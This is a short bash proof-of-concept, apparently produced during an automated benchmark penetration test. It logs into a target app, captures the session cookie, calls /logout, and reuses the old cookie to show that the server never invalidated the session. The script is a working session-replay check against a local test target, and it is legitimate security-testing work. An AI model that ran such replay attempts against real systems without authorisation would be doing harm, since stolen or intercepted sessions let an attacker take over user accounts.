#!/bin/bash
# POC: Demonstrates that session tokens remain valid after logout by attempting to access protected resources using an old session token (updated for GET method)
# Target: ./repo
# Created: 2025-11-04T19:50:17.723Z
# Session: benchmark-XBEN-023-24-mhkytbq3

# Session Not Invalidated Server-Side After Logout POC (v2)
# This script demonstrates that old session tokens can be reused after logout

TARGET_URL="${1:-http://localhost:80}"
USERNAME="test"
PASSWORD="test"

echo "[*] Session Not Invalidated After Logout POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login to obtain a session token
echo "[+] Step 1: Logging in as $USERNAME:$PASSWORD"
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&password=$PASSWORD")

# Extract session cookie from login response
SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -i "set-cookie:" | grep "session=" | sed 's/.*session=\([^;]*\).*/\1/')

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to obtain session cookie from login"
  exit 1
fi

echo "[+] Obtained session cookie: $SESSION_COOKIE"
echo ""

# Step 2: Verify access to protected resource with valid session
echo "[+] Step 2: Verifying access to /home with valid session"
HOME_RESPONSE_BEFORE=$(curl -s -i -H "Cookie: session=$SESSION_COOKIE" "$TARGET_URL/home")
HTTP_CODE_BEFORE=$(echo "$HOME_RESPONSE_BEFORE" | head -n 1)
echo "[+] Response: $HTTP_CODE_BEFORE"

if echo "$HOME_RESPONSE_BEFORE" | grep -q "200 OK"; then
  echo "[+] Access to /home GRANTED before logout (expected)"
else
  echo "[-] Unexpected response before logout"
  echo "$HOME_RESPONSE_BEFORE" | head -20
fi
echo ""

# Step 3: Call logout endpoint (try GET method based on 405 error)
echo "[+] Step 3: Calling /logout endpoint"
LOGOUT_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/logout" \
  -H "Cookie: session=$SESSION_COOKIE")

echo "[+] Logout response:"
echo "$LOGOUT_RESPONSE" | head -10
echo ""

# Step 4: Attempt to access protected resource with OLD session token
echo "[+] Step 4: Attempting to access /home with OLD session token after logout"
HOME_RESPONSE_AFTER=$(curl -s -i -H "Cookie: session=$SESSION_COOKIE" "$TARGET_URL/home")
HTTP_CODE_AFTER=$(echo "$HOME_RESPONSE_AFTER" | head -n 1)
echo "[+] Response: $HTTP_CODE_AFTER"
echo ""

# Check if vulnerable
if echo "$HTTP_CODE_AFTER" | grep -q "200 OK"; then
  echo "[!] VULNERABILITY CONFIRMED: Old session token still valid after logout!"
  echo "[!] An attacker can continue using intercepted session tokens even after logout"
  echo "[!] This indicates no server-side session invalidation is performed"
  exit 0
elif echo "$HTTP_CODE_AFTER" | grep -q "401\|403\|302"; then
  echo "[-] Session was properly invalidated"
  echo "[-] Vulnerability NOT present"
  exit 1
else
  echo "[?] Unexpected response code: $HTTP_CODE_AFTER"
  echo "$HOME_RESPONSE_AFTER" | head -20
  exit 1
fi